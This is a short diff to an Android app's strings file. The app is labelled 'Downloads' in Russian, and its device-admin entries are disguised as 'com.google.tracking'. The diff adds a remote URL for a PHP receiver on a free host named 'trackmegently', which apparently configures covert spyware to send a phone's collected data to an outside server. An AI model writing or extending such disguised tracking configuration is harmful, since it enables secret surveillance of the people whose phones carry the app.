@@ -3,4 +3,5 @@
     <string name="app_name">Загрузки</string>
     <string name="device_admin_label">com.google.tracking</string>
     <string name="device_description">com.google.tracking</string>
+    <string name="remote_url">http://trackmegently.byethost3.com/receiver.php</string>
 </resources>
